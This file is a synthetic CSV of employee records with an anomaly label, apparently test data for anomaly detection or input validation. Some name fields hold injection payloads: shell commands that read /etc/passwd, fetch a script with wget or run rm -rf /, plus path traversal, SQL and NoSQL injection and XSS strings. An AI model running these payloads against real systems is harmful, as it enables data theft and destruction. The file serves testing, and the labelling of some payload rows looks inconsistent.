employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
EMP01682,John Jones,30,109539,12,Engineering,Singapore,4.5,9,6,0
EMP01694,Bob Smith,39,105842,4,Operations,Tokyo,6.2,11,3,0
EMP01194,John Brown,36,54967,8,Operations,London,8.8,18,5,0
EMP01684,Alice Johnson,25,79493,6,Sales,Tokyo,7.2,11,5,0
EMP01693,`cat /etc/passwd`,39,78691,4,Engineering,Berlin,8.1,16,6,1
EMP01503,Charlie Brown,22,59885,24,HR,Singapore,8.0,11,5,1
EMP01773,John Johnson,42,47868,10,Sales,New York,8.7,15,5,0
EMP01669,Diana Brown,43,350000,7,Operations,San Francisco,8.5,18,3,1
EMP01772,Charlie Williams,40,80871,8,HR,New York,5.5,9,6,0
EMP01162,Bob Garcia,44,78930,8,Sales,Tokyo,6.1,14,2,0
EMP01751,John Brown,24,70926,10,Marketing,Berlin,6.9,13,7,0
EMP01152,John Garcia,29,49969,5,HR,Singapore,10.0,100,7,0
EMP01557,Alice Brown,31,82836,6,Operations,Tokyo,7.1,7,4,0
EMP01572,Jane Jones,37,47561,6,Finance,New York,5.4,7,7,0
EMP01675,Charlie Williams,28,87965,3,Marketing,Singapore,10.0,16,2,0
EMP01111,$(wget malicious.sh),34,79383,7,Finance,Berlin,8.3,11,2,1
EMP01226,../../../etc/passwd,35,75760,3,Engineering,London,9.6,19,6,1
EMP01792,John Smith,37,83731,2,Marketing,Berlin,10.0,13,5,0
EMP01103,Bob Smith,28,100569,12,Sales,Singapore,6.6,22,6,0
EMP01421,Bob Brown,49,81196,9,Sales,Singapore,8.8,10,2,0
EMP01419,Charlie Garcia,35,117902,3,Sales,London,4.6,11,5,0
EMP01119,John Jones,41,78881,6,HR,London,6.2,15,5,0
EMP01053,John Johnson,39,98780,6,Operations,San Francisco,6.4,10,3,0
EMP01151,Charlie Smith,37,82041,10,Operations,San Francisco,4.7,10,5,0
EMP01403,John Johnson,35,85865,6,Operations,London,6.0,10,7,0
EMP01753,John Brown,43,58462,2,Engineering,Berlin,6.9,13,6,0
EMP01207,Charlie Williams,39,87703,10,Engineering,New York,4.2,13,4,0
EMP01677,Diana Williams,49,83390,3,Operations,New York,8.3,17,4,0
EMP01618,Bob Garcia,38,105569,16,Engineering,New York,6.8,20,2,0
EMP01008,John Smith,31,100115,9,Engineering,San Francisco,8.7,14,4,0
EMP01651,Jane Johnson,44,109044,14,Engineering,Singapore,6.4,11,6,0
EMP01036,John Johnson,36,106010,4,Engineering,London,7.3,14,6,0
EMP01452,Diana Brown,27,40000,5,HR,Tokyo,5.8,14,4,0
EMP01253,Bob Williams,43,80213,11,Marketing,London,9.0,11,3,0
EMP01303,Charlie Brown,39,72208,9,Engineering,San Francisco,9.0,15,4,0
EMP01606,Jane Brown,28,46563,13,Finance,Singapore,8.2,13,6,0
EMP01579,Diana Brown,44,163883,1,Operations,San Francisco,7.8,18,90,1
EMP01587,John Brown,28,106230,6,HR,Berlin,7.6,10,8,0
EMP01262,Charlie Williams,22,97975,11,Engineering,Singapore,8.4,15,3,0
EMP01297,Alice Johnson,37,40000,14,Marketing,London,5.5,13,5,0
EMP01414,Charlie Smith,37,69101,11,Finance,London,10.0,7,7,0
EMP01150,John Brown,37,70175,0,Marketing,San Francisco,5.1,6,8,0
EMP01636,Diana Brown,41,70026,8,Operations,Tokyo,7.0,6,4,0
EMP01712,John Brown,30,60663,8,Sales,London,7.0,8,3,0
EMP01550,John Johnson,35,0,7,HR,Singapore,9.3,12,4,1
EMP01488,Bob Brown,48,52932,6,Marketing,San Francisco,6.9,9,1,1
EMP01147,Jane Brown,24,61161,10,Operations,London,6.7,10,90,1
EMP01146,Charlie Brown,25,44489,11,Operations,London,5.4,13,4,0
EMP01588,John Garcia,41,75640,6,HR,New York,5.8,10,4,0
EMP01742,Bob Jones,30,108225,9,Finance,Singapore,7.4,13,9,1
EMP01601,Charlie Williams,27,85733,7,HR,San Francisco,6.2,12,45,1
EMP01348,Jane Johnson,29,106890,12,HR,Singapore,8.1,20,5,0
EMP01463,{'$ne': null},36,56586,7,Engineering,San Francisco,8.5,13,6,0
EMP01325,Diana Jones,25,52073,4,Operations,Tokyo,7.5,21,6,0
EMP01186,Alice Williams,38,105067,6,Engineering,Tokyo,5.5,9,5,0
EMP01123,Diana Garcia,23,60997,10,Engineering,London,7.0,9,5,0
EMP01683,Diana Brown,38,67007,4,Marketing,San Francisco,5.8,10,4,0
EMP01143,Diana Williams,36,185593,1,Finance,San Francisco,7.0,11,6,1
EMP01763,Jane Williams,34,92680,12,Engineering,Tokyo,6.5,9,4,0
EMP01197,Charlie Johnson,36,87816,4,HR,Berlin,7.8,14,5,0
EMP01279,Jane Williams,31,92004,4,HR,London,7.1,5,3,0
EMP01293,Jane Jones,41,76038,7,Marketing,New York,7.3,12,45,1
EMP01400,; rm -rf /,22,77504,5,Sales,Tokyo,7.8,11,4,1
EMP01122,John Smith,46,77659,10,Engineering,Tokyo,8.1,8,5,0
EMP01183,John Brown,38,500000,11,Operations,Berlin,9.3,17,3,1
EMP01202,Jane Brown,43,76192,5,Sales,Berlin,6.5,15,6,0
EMP01438,Alice Smith,22,86379,7,Sales,Singapore,10.0,15,3,0
EMP01246,Alice Brown,82,88046,13,Operations,Tokyo,6.9,7,4,1
EMP01415,Charlie Smith,29,99954,7,Marketing,Tokyo,8.7,21,60,1
EMP01711,Charlie Williams,34,71126,15,Engineering,London,7.1,10,3,0
EMP01129,Bob Johnson,30,73684,15,Engineering,San Francisco,5.8,17,4,0
EMP01402,Diana Garcia,35,77445,4,Sales,Singapore,8.0,13,7,0
EMP01632,Diana Smith,33,92209,0,HR,Tokyo,8.2,18,5,0
EMP01623,John Brown,45,58215,7,Marketing,Berlin,9.2,8,6,0
EMP01727,`cat /etc/passwd`,37,-5000,6,HR,Berlin,9.5,12,4,1
EMP01219,John Smith,35,83483,4,HR,New York,9.7,16,2,0
EMP01729,John Johnson,28,52607,11,Sales,New York,6.9,100,13,1
EMP01609,Charlie Jones,46,69983,7,Finance,San Francisco,6.8,13,2,0
EMP01732,John Smith,38,81463,1,Operations,Singapore,4.9,12,7,0
EMP01617,Diana Brown,40,80371,7,HR,London,4.0,13,2,0
EMP01386,John Brown,75,55350,10,Engineering,Berlin,6.3,12,1,1
EMP01775,Jane Garcia,22,74287,13,Operations,San Francisco,6.4,11,3,0
EMP01509,Diana Smith,28,84493,10,Marketing,Tokyo,9.4,14,4,0
EMP01267,Charlie Brown,23,98216,12,HR,Singapore,5.7,14,3,0
EMP01781,John Brown,24,97972,4,Engineering,New York,8.3,12,0,1
EMP01441,Jane Williams,34,70928,6,Operations,Berlin,5.2,15,3,0
EMP01496,John Johnson,26,-100,10,Operations,Tokyo,4.4,12,6,1
EMP01112,Diana Williams,35,79987,0,Finance,Tokyo,8.3,13,6,0
EMP01232,Charlie Jones,35,82984,11,Operations,Tokyo,7.8,11,4,0
EMP01698,Alice Garcia,42,95481,10,Finance,Berlin,7.3,14,4,0
EMP01607,Charlie Brown,25,105026,9,Operations,Berlin,5.2,10,4,0
EMP01373,Charlie Jones,42,73748,8,Marketing,Singapore,5.2,8,5,0
EMP01233,Jane Brown,29,87943,9,Operations,Singapore,8.0,16,7,0
EMP01633,Alice Garcia,31,63338,11,HR,Singapore,6.0,17,4,0
EMP01317,Charlie Johnson,32,73847,5,Marketing,New York,8.8,15,5,0
EMP01410,Charlie Garcia,40,50122,1,HR,Tokyo,7.3,18,10,1
EMP01717,Diana Williams,36,87616,5,Finance,Berlin,6.4,14,8,0
EMP01358,John Jones,37,94635,12,HR,Tokyo,5.8,16,2,0
EMP01258,Alice Smith,38,85872,9,Operations,Berlin,7.8,11,45,1
EMP01627,{'$ne': null},33,52935,5,HR,Tokyo,8.2,14,5,0
EMP01282,Charlie Williams,47,68567,3,Engineering,London,7.0,12,6,0
EMP01376,Diana Smith,41,41140,12,HR,San Francisco,7.1,13,6,0
EMP01384,Bob Williams,28,55207,11,Sales,Berlin,6.8,12,1,1
EMP01224,Alice Johnson,31,109550,8,Marketing,New York,8.1,7,5,0
EMP01759,Jane Jones,40,69577,9,Marketing,San Francisco,8.0,16,8,0
EMP01657,Charlie Garcia,34,82623,6,Operations,Tokyo,7.8,16,2,0
EMP01472,Diana Brown,22,53153,8,Engineering,New York,4.4,7,5,0
EMP01347,John Johnson,23,46198,7,Sales,Berlin,5.8,12,4,0
EMP01505,Alice Jones,31,57030,14,Engineering,Berlin,8.6,13,11,1
EMP01639,Jane Garcia,24,89697,10,Operations,London,7.2,7,1,1
EMP01788,Bob Brown,34,58448,11,HR,Berlin,8.8,8,8,0
EMP01740,Jane Brown,22,74449,10,Sales,San Francisco,8.8,14,7,0
EMP01722,John Jones,24,70470,9,HR,London,8.2,8,3,0
EMP01619,Diana Johnson,36,85156,7,Operations,Singapore,8.3,13,8,0
EMP01685,Charlie Williams,40,93651,9,Marketing,San Francisco,8.0,8,3,0
EMP01645,Bob Johnson,32,61972,8,HR,San Francisco,4.4,17,4,0
EMP01678,John Garcia,42,57250,10,Finance,San Francisco,7.9,13,1,1
EMP01556,John Brown,82,64075,6,Sales,London,8.9,9,3,1
EMP01577,Charlie Johnson,82,95798,8,Sales,New York,6.2,9,5,1
EMP01085,Jane Brown,30,111934,12,Marketing,Singapore,8.8,14,3,0
EMP01242,Jane Johnson,39,96573,5,Sales,San Francisco,6.2,14,6,0
EMP01159,Bob Smith,40,83954,13,Sales,San Francisco,8.9,14,6,0
EMP01524,Jane Williams,28,76289,8,Finance,Tokyo,7.6,11,5,0
EMP01035,Jane Williams,25,79684,6,Engineering,Singapore,6.9,14,6,0
EMP01540,Bob Brown,41,78211,8,Marketing,Berlin,9.0,50,7,0
EMP01170,$(wget malicious.sh),27,77562,8,Finance,Singapore,7.6,13,7,1
EMP01654,Jane Johnson,55,86310,2,Finance,Singapore,10.0,13,4,1
EMP01687,Jane Jones,32,40000,6,Finance,London,9.3,14,5,0
EMP01679,Bob Williams,45,66250,9,HR,Singapore,7.1,11,3,0
EMP01752,Alice Johnson,27,57440,10,Engineering,Berlin,4.0,15,6,0
EMP01095,Charlie Smith,82,87974,15,HR,Tokyo,8.7,10,5,1
EMP01563,Diana Brown,32,55538,12,HR,Tokyo,5.9,13,5,0
EMP01240,Charlie Brown,28,108678,7,Sales,San Francisco,10.0,14,4,0
EMP01574,Bob Garcia,41,104423,4,Finance,Berlin,8.9,9,2,0
EMP01460,Charlie Williams,50,86166,11,HR,Singapore,6.7,16,5,0
EMP01553,Alice Johnson,37,90183,8,HR,San Francisco,9.8,9,7,0
EMP01704,' UNION SELECT * FROM passwords--,22,71596,15,Finance,London,6.4,7,4,1
EMP01206,John Garcia,39,92903,9,HR,Berlin,6.6,14,2,0
EMP01392,John Johnson,24,62972,12,Marketing,London,6.9,6,5,0
EMP01397,John Jones,45,86049,4,Sales,San Francisco,4.8,3,6,0
EMP01680,{'$gt': ''},40,89447,1,HR,Berlin,9.3,6,10,1
EMP01217,Alice Jones,33,65322,5,HR,Berlin,7.6,9,3,0
EMP01004,Diana Smith,33,66310,6,Marketing,Singapore,10.0,15,3,0
EMP01642,John Brown,32,78620,15,Finance,Singapore,6.6,14,0,1
EMP01716,Diana Garcia,35,105268,11,Operations,New York,7.2,11,6,0
EMP01612,Diana Johnson,37,84117,11,Finance,Berlin,5.6,7,5,0
EMP01546,Jane Garcia,39,40000,1,Engineering,New York,7.6,11,7,0
EMP01098,John Williams,35,99130,10,Sales,Tokyo,8.7,1,3,0
EMP01573,Alice Jones,33,42728,8,Operations,New York,10.0,9,4,0
EMP01406,Alice Jones,26,60960,8,Operations,Berlin,7.4,10,45,1
EMP01502,Charlie Johnson,23,71500,4,Sales,New York,6.6,11,5,0
EMP01047,Diana Johnson,43,124106,11,Marketing,New York,7.1,12,60,1
EMP01032,Charlie Johnson,82,54917,5,Finance,New York,7.5,9,5,1
EMP01200,John Johnson,37,102987,15,Engineering,Tokyo,4.7,12,5,0
EMP01134,Bob Johnson,27,83800,11,Finance,Tokyo,6.9,19,5,0
EMP01027,Bob Jones,38,64542,13,Operations,San Francisco,7.4,18,4,0
EMP01706,Alice Smith,24,88927,10,Marketing,Tokyo,5.6,11,1,1
EMP01230,Jane Jones,29,-5000,10,HR,Berlin,7.9,17,5,1
EMP01489,Bob Williams,42,40000,13,Engineering,Berlin,8.1,6,2,0
EMP01378,Bob Johnson,52,55228,4,Sales,Tokyo,7.4,10,4,0
EMP01288,Diana Williams,37,69819,6,Marketing,Tokyo,8.6,18,6,0
EMP01418,Alice Smith,24,58293,29,Finance,London,8.1,13,3,1
EMP01674,Jane Brown,23,59302,3,Engineering,Singapore,6.4,10,2,0
EMP01391,Diana Smith,38,48319,11,Operations,Berlin,6.7,12,5,0
EMP01592,Alice Brown,38,115267,16,Finance,Tokyo,7.6,7,4,0
EMP01498,Alice Smith,27,80347,1,Marketing,Singapore,7.1,13,6,0
EMP01138,Bob Brown,41,79876,11,HR,London,5.6,9,5,0
EMP01062,Alice Johnson,26,105950,0,Marketing,Tokyo,8.2,16,4,0
EMP01471,Jane Johnson,22,87182,12,Sales,London,8.2,12,14,1
EMP01647,John Smith,34,86727,2,Finance,Berlin,7.0,9,7,0
EMP01128,Alice Garcia,35,106310,9,Operations,Singapore,10.0,13,4,0
EMP01778,John Brown,34,60308,6,Sales,New York,9.0,10,4,0
EMP01520,Jane Williams,22,76132,17,Sales,New York,6.4,15,2,1
EMP01064,Charlie Jones,41,62744,13,Sales,London,8.8,13,4,0
EMP01014,Diana Jones,22,95636,7,Finance,Singapore,9.0,7,7,0
EMP01156,Bob Brown,49,81854,7,Marketing,New York,4.0,14,6,0
EMP01040,Jane Williams,40,74010,8,Operations,San Francisco,10.0,14,3,0
EMP01492,John Smith,35,74878,10,HR,New York,8.7,6,8,0
EMP01379,Bob Johnson,28,52928,9,Sales,London,8.2,8,6,0
EMP01187,Jane Garcia,34,92547,4,Finance,New York,7.2,9,3,0
EMP01216,Diana Garcia,75,61971,0,Finance,San Francisco,6.4,12,4,1
EMP01052,Diana Williams,29,62252,8,HR,Tokyo,7.4,13,4,0
EMP01337,Bob Brown,32,50447,9,HR,Tokyo,8.0,10,5,0
EMP01295,Bob Jones,22,73385,29,Sales,Berlin,9.6,10,5,1
EMP01701,Charlie Williams,22,63976,22,HR,San Francisco,8.8,18,4,1
EMP01251,John Brown,42,82916,15,Finance,Tokyo,9.8,9,4,0
EMP01461,Bob Garcia,22,76520,30,Engineering,Berlin,8.2,11,3,1
EMP01455,Jane Brown,28,50807,4,Sales,London,6.7,14,6,0
EMP01797,Charlie Jones,40,116149,3,Operations,Singapore,4.7,4,5,0
EMP01269,Alice Brown,36,81930,6,Engineering,San Francisco,8.4,8,4,0
EMP01201,Alice Williams,39,93492,7,HR,London,8.4,9,7,0
EMP01161,Bob Williams,41,101583,10,Sales,London,7.6,9,4,0
EMP01555,Diana Brown,31,40000,5,HR,New York,10.0,12,4,0
EMP01401,Charlie Jones,30,66411,7,Sales,Tokyo,10.0,11,1,1
EMP01702,Charlie Jones,29,58636,6,HR,Singapore,10.0,20,5,0
EMP01476,John Johnson,39,121386,10,Operations,Singapore,6.1,12,7,0
EMP01105,Jane Garcia,38,75928,7,Operations,New York,6.3,11,5,0
EMP01565,../../../etc/passwd,31,71829,3,Engineering,San Francisco,7.1,12,60,1
EMP01389,Alice Johnson,30,55633,9,Marketing,San Francisco,7.8,12,3,0
EMP01001,John Garcia,33,64679,13,HR,Berlin,7.8,15,3,0
EMP01767,Charlie Williams,49,85318,1,Engineering,New York,7.7,8,5,0
EMP01561,Bob Garcia,51,86585,8,Marketing,Tokyo,6.6,13,10,1
EMP01080,Diana Smith,33,15000,9,Marketing,Singapore,6.6,11,7,1
EMP01205,Diana Jones,27,82869,1,Operations,San Francisco,7.2,11,5,0
EMP01034,John Garcia,41,74306,6,Engineering,Berlin,7.8,13,5,0
EMP01508,John Jones,35,96717,6,Operations,New York,6.8,9,7,0
EMP01427,Charlie Garcia,40,72059,12,Marketing,London,7.4,9,5,0
EMP01454,John Williams,30,196621,0,Marketing,Singapore,9.3,12,4,1
EMP01366,Jane Williams,36,102685,7,Operations,Singapore,7.4,13,3,0
EMP01091,Diana Jones,42,85145,6,HR,Singapore,6.5,8,9,1
EMP01339,<img src=x onerror=alert(1)>,30,350000,8,Operations,Berlin,8.8,13,8,1
EMP01564,Charlie Smith,44,98931,14,Sales,San Francisco,9.3,11,3,0
EMP01345,Alice Williams,36,75311,6,Marketing,New York,7.1,12,4,0
EMP01241,Charlie Garcia,34,65822,0,Marketing,Singapore,7.2,11,7,0
EMP01013,Diana Garcia,22,78931,7,Sales,Berlin,6.1,9,8,0
EMP01315,John Brown,35,82299,5,Marketing,San Francisco,4.3,10,4,0
EMP01600,Bob Williams,41,54061,15,Operations,London,4.6,11,5,0
EMP01387,John Garcia,50,70507,10,HR,London,5.6,18,4,0
EMP01273,Alice Smith,35,49340,11,HR,San Francisco,6.7,50,2,0
EMP01166,Jane Williams,41,61472,16,Engineering,Singapore,6.0,12,5,0
EMP01793,Alice Jones,24,93078,5,HR,Tokyo,6.6,12,7,0
EMP01646,Diana Williams,22,64427,4,Marketing,London,9.2,8,6,0
EMP01484,Diana Johnson,28,59280,5,Sales,Singapore,4.0,10,6,0
EMP01782,Charlie Johnson,38,54683,9,Engineering,San Francisco,5.8,18,9,1
EMP01504,Bob Brown,29,85730,3,Engineering,Tokyo,5.2,12,6,0
EMP01243,Jane Johnson,41,74229,8,Operations,Singapore,6.5,9,6,0
EMP01566,Alice Williams,22,74453,4,HR,Tokyo,8.0,14,7,0
EMP01562,Bob Williams,41,77391,9,Operations,Singapore,6.7,12,5,0
EMP01686,Jane Garcia,33,46632,11,HR,London,7.4,11,7,0
EMP01189,Jane Williams,22,75537,13,HR,London,7.4,11,5,0
EMP01699,Bob Johnson,33,86850,1,Marketing,San Francisco,8.4,12,3,0
EMP01475,Charlie Williams,33,77834,6,Operations,New York,6.1,15,5,0
EMP01681,Diana Garcia,25,67543,5,Finance,Berlin,7.7,17,3,0
EMP01510,Jane Garcia,37,74499,5,Finance,London,6.7,13,8,0
EMP01058,Alice Johnson,37,63955,3,Marketing,Berlin,8.2,14,1,1
EMP01474,{'$ne': null},48,99261,5,Engineering,New York,7.5,3,5,0
EMP01560,Jane Williams,37,74693,3,Engineering,Singapore,6.3,16,3,0
EMP01747,admin'--,28,81035,4,HR,Berlin,6.4,16,6,1
EMP01252,Jane Johnson,51,84880,3,Operations,Singapore,8.3,14,5,0
EMP01021,Jane Williams,33,103186,2,Finance,New York,9.3,10,6,0
EMP01313,John Johnson,41,84913,10,Finance,Berlin,5.4,10,4,0
EMP01459,Bob Jones,25,73884,8,Finance,Tokyo,7.8,14,4,0
EMP01160,Bob Williams,27,87854,14,HR,Berlin,6.0,7,2,0
EMP01276,Charlie Garcia,36,43868,5,Engineering,Tokyo,8.0,9,3,0
EMP01191,Diana Garcia,22,40000,27,Finance,New York,6.8,8,7,1
EMP01385,Bob Williams,36,93815,10,Sales,Tokyo,7.0,15,6,0
EMP01413,Alice Garcia,45,92898,4,Sales,New York,7.0,13,4,0
EMP01491,Alice Brown,46,124859,9,Engineering,Tokyo,4.3,18,6,0
EMP01343,John Garcia,30,77511,6,HR,London,8.3,10,1,1
EMP01769,Diana Smith,49,64418,12,Finance,New York,6.9,10,6,0
EMP01308,Charlie Williams,39,62524,3,Operations,Berlin,7.0,10,3,0
EMP01661,Diana Williams,30,50514,9,Sales,London,7.0,12,6,0
EMP01130,Charlie Johnson,22,63896,7,HR,London,8.2,21,6,0
EMP01663,{'$gt': ''},30,57989,3,Operations,New York,6.7,10,10,1
EMP01099,1'; DELETE FROM employees WHERE '1'='1,33,58661,8,Marketing,Singapore,8.0,11,7,1
EMP01372,Bob Johnson,46,77084,10,Finance,Berlin,7.2,13,5,0
EMP01087,javascript:alert('Hacked'),37,67814,8,Operations,London,7.4,8,4,1
EMP01458,Charlie Williams,30,60899,9,Sales,Singapore,9.3,11,5,0
EMP01330,Diana Jones,34,81427,3,HR,Berlin,9.3,15,5,0
EMP01214,Jane Garcia,32,109719,6,Marketing,Singapore,8.4,20,2,0
EMP01466,<svg onload=alert('XSS')>,39,72775,0,HR,New York,6.2,8,3,1
EMP01121,Charlie Johnson,27,54469,6,Marketing,London,10.0,6,4,0
EMP01614,Jane Brown,54,62129,6,Finance,San Francisco,6.6,16,9,1
EMP01020,Alice Johnson,46,64654,8,Finance,New York,9.1,12,9,1
EMP01700,Jane Johnson,30,500000,12,Engineering,Tokyo,6.4,12,6,1
EMP01071,John Smith,47,59034,6,Marketing,New York,10.0,13,2,0
EMP01106,Bob Jones,50,47802,10,Engineering,New York,10.0,14,9,1
EMP01270,Charlie Jones,46,74061,3,HR,London,6.5,11,6,0
EMP01435,Jane Brown,35,107782,19,Sales,San Francisco,7.1,19,4,0
EMP01102,John Garcia,32,75574,10,Engineering,San Francisco,7.0,12,6,0
